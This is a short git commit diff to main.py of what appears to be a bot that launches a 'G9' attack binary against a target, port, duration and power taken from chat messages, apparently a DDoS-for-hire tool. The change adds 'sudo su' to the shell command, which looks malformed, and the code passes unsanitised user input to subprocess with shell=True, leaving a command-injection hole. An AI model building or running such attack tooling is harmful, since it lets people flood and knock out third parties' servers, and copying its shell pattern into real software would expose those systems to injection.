9af4fd6240dd426482b1222ea475a04cf33b1f97
yespap589 <h.nibal91@gmail.com>
2024-11-04 12:46:19 +0530

    Update main.py

--- main.py
+++ main.py
@@ -23,7 +23,7 @@ def handle_G9(message):
             response = "Error: Time interval must be less than 501."
         else:
             start_attack_reply(message, target, port, time, power)  # Call start_attack_reply function
-            full_command = f"./G9 {target} {port} {time} {power}"
+            full_command = f"sudo su ./G9 {target} {port} {time} {power}"
             subprocess.run(full_command, shell=True)  # Run the command in the shell
             response = f"G9 Attack Finished. Target: {target} Port: {port} Time: {time} seconds."
     else:
